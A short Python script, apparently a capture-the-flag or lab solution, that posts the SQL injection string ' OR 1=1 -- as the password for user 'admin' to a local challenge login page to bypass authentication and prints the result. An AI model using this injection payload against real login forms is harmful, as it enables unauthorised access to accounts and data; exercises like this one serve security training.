import requests

session = requests.Session()
url = "http://challenge.localhost/authentication"
data = {
    "login-name": "admin",
    "key": "' OR 1=1 --"
}
session.post(url, data=data)
response = session.get(url)
print(response.text)
